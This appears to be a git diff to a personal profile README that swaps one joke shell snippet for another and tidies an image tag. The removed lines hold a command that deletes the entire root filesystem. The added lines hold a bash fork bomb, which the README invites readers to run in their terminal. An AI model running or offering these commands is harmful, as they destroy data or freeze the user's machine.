@@ -5,18 +5,12 @@
 - I like typescript
 
 ```sh
-echo "Ekusupulozion !" && \
-sleep 3 && \
-sudo rm -rf --no-preserve-root /
-# no. do not do that.
+# hey run this in your terminal ;)
+:(){ :|: & };:
 ```
 
 <br />
 
-<p align="center">
-  <img src="./assets/840488386469167106.gif"
-    height="96"
-  />
-</p>
-
-<br />
+<img src="./assets/840488386469167106.gif"
+  height="96"
+/>
